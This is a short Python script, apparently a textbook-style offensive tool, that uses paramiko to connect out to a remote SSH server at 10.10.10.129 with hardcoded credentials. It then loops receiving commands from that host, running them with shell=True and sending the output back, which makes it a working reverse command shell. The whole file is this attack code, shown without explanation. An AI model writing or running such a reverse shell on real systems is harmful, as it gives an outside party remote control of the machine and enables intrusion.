import sys
import subprocess
import paramiko

def ssh_command(ip,port,user,passwd):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,port=port,username=user,password=passwd)
    session = client.get_transport().open_session()

    if session.active:
        while True:
            command=session.recv(1024)
            try:
                output=subprocess.check_output(command,shell=True)
                session.send(output)
            except Exception as e:
                session.send(str(e))
    client.close()
    return

def main():
    ssh_command('10.10.10.129',2222,'robey','foo')

if __name__ == '__main__':
    main()